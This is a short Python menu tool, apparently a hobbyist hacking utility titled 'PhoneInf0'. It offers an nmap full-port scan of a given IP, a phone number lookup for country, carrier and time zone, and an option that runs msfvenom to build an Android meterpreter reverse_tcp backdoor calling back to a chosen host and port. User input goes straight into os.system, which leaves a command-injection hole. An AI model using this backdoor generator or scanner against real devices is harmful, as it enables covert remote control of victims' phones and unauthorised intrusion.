import os
import phonenumbers
from phonenumbers import geocoder,carrier,timezone
import colorama
from colorama import Fore,Back,Style

print(Fore.BLUE +"""




  _____  _                      _____        __  ___  
 |  __ \| |                    |_   _|      / _|/ _ \ 
 | |__) | |__   ___  _ __   ___  | |  _ __ | |_| | | |
 |  ___/| '_ \ / _ \| '_ \ / _ \ | | | '_ \|  _| | | |
 | |    | | | | (_) | | | |  __/_| |_| | | | | | |_| |
 |_|    |_| |_|\___/|_| |_|\___|_____|_| |_|_|  \___/ 
                                                      
                   By && Vietnar                                   

1)Phone Port Scan With NMAP
2)Phone Number Location
3)Android Phone Backdoor With Msfvenom    
4)Quit
      

""")


while True:
    deger = int(input(Fore.RED + "Choose A Number: "))
    if deger == 1:
        ıp_adres = input(Fore.RED + "Ip Adress: ")
        os.system("nmap -p- -sV -sS " + ıp_adres)
        print(Fore.GREEN + "Scan Completed...")
    elif deger == 2:
        p_number = input(Fore.RED + "Phone Number With Country Code: ")
        phone_number = phonenumbers.parse(p_number, None)
        print(Fore.GREEN + "Country/City: ",geocoder.description_for_number(phone_number,'tr'))
        print(Fore.GREEN + "Time zone: ",timezone.time_zones_for_number(phone_number))
        print(Fore.GREEN + "Operator: ",carrier.name_for_number(phone_number,'tr'))
    elif deger == 3:
        ipx = input(Fore.RED + "Ip Adress: ")
        prt = input(Fore.RED + "Port: ")
        path = input(Fore.RED + "Write The Path: ")
        command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ipx} LPORT={prt} -f raw > {path}"
        os.system(command)
    elif deger == 4:
        exit()
    else:
        input(Fore.RED + "You made a wrong keystroke, try again...")
    
